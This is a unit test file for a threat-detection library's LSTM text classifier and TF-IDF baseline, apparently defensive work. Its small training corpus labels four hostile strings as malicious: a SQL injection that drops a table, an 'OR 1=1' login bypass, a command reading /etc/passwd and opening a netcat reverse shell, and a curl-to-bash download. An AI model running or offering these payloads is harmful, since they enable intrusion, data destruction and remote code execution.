"""Unit tests for the LSTM text classifier and TF-IDF baseline."""

from __future__ import annotations

import numpy as np
import pytest

from threat_detection.config import LSTMConfig, TextTokenizerConfig
from threat_detection.features.text import TextTokenizer
from threat_detection.models.text_baseline import TfidfBaseline
from threat_detection.models.text_lstm import LSTMNet, TextClassifier

pytestmark = pytest.mark.unit


# A tiny but linearly-separable-ish corpus: malicious payloads vs benign cmds.
_MAL = [
    "'; DROP TABLE users; --",
    "; cat /etc/passwd; nc 10.0.0.1 4444 -e /bin/sh",
    "$(curl http://1.2.3.4/x.sh | bash)",
    "admin' OR '1'='1' --",
]
_BEN = [
    "ls -la /home/alice",
    "git pull origin main",
    "systemctl status nginx",
    "SELECT name FROM orders WHERE id = 5",
]


def _corpus(reps: int = 60) -> tuple[list[str], np.ndarray]:
    texts = (_MAL + _BEN) * reps
    y = np.array(([1] * len(_MAL) + [0] * len(_BEN)) * reps, dtype=np.int64)
    return texts, y


@pytest.fixture
def tokenizer() -> TextTokenizer:
    texts, _ = _corpus()
    return TextTokenizer(TextTokenizerConfig(level="char", max_len=64)).fit(texts)


@pytest.fixture
def fast_cfg() -> LSTMConfig:
    return LSTMConfig(embedding_dim=16, hidden_dim=16, max_epochs=4, batch_size=64, device="cpu")


def test_net_forward_shape(tokenizer: TextTokenizer, fast_cfg: LSTMConfig) -> None:
    import torch

    net = LSTMNet(tokenizer.vocab_size, fast_cfg)
    x = torch.zeros((5, 64), dtype=torch.long)
    out = net(x)
    assert out.shape == (5,)  # one logit per sample


def test_predict_proba_in_unit_interval(tokenizer: TextTokenizer, fast_cfg: LSTMConfig) -> None:
    texts, y = _corpus(20)
    clf = TextClassifier(fast_cfg, tokenizer, seed=0).fit(texts, y)
    proba = clf.predict_proba(_MAL + _BEN)
    assert proba.shape == (len(_MAL) + len(_BEN),)
    assert (proba >= 0.0).all() and (proba <= 1.0).all()


def test_learns_malicious_vs_benign(tokenizer: TextTokenizer, fast_cfg: LSTMConfig) -> None:
    """After a short train, clear payloads should outscore clear benign commands."""
    texts, y = _corpus(80)
    clf = TextClassifier(fast_cfg, tokenizer, seed=0).fit(texts, y)
    mal_score = clf.predict_proba(_MAL).mean()
    ben_score = clf.predict_proba(_BEN).mean()
    assert mal_score > ben_score


def test_save_load_parity(tokenizer: TextTokenizer, fast_cfg: LSTMConfig, tmp_path) -> None:
    texts, y = _corpus(20)
    clf = TextClassifier(fast_cfg, tokenizer, seed=0).fit(texts, y)
    clf.threshold = 0.42
    expected = clf.predict_proba(_MAL + _BEN)

    path = tmp_path / "text_lstm.pt"
    clf.save(path)
    reloaded = TextClassifier.load(path, tokenizer)
    np.testing.assert_allclose(expected, reloaded.predict_proba(_MAL + _BEN), rtol=1e-5, atol=1e-6)
    assert reloaded.threshold == 0.42


def test_tfidf_baseline_separates(tmp_path) -> None:
    texts, y = _corpus(40)
    base = TfidfBaseline(seed=0).fit(texts, y)
    assert base.predict_proba(_MAL).mean() > base.predict_proba(_BEN).mean()
